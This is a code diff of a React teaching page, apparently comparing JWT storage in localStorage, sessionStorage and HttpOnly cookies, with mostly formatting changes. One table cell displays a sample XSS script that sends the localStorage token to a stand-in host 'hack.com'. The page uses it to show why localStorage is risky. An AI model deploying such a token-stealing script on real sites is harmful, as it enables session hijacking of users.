@@ -326,10 +326,7 @@ const JwtTokens = () => {
             <br />
 
 {`<script>
-fetch(
- "https://hack.com?token=" +
- localStorage.getItem("token")
-)
+fetch("https://hack.com?token=" +localStorage.getItem("token"))
 </script>`}
           </td>
 
@@ -396,13 +393,11 @@ fetch(
 
           <td style={styles.td}>
 {`localStorage.clear()
-
 localStorage.removeItem("token")`}
           </td>
 
           <td style={styles.td}>
 {`sessionStorage.clear()
-
 sessionStorage.removeItem("token")`}
           </td>
 
@@ -414,15 +409,11 @@ sessionStorage.removeItem("token")`}
 
           <td style={styles.td}>
             Cannot remove directly from JS
-            <br /><br />
-
+<br/>
             Backend must send:
-            <br /><br />
-
-{`Set-Cookie:
-token=;
-HttpOnly;
-Expires=PastDate`}
+<br/>
+{`Set-Cookie: token=;
+HttpOnly; Expires=PastDate`}
           </td>
         </tr>
 
@@ -589,7 +580,7 @@ Expires=PastDate`}
 {/* ====================================== */}
 {/* DEMO */}
 {/* ====================================== */}
-
+<h2>How JWT directly managed by browser dealing with authentication of the user </h2>
 <div
   style={{
     background: "#111",
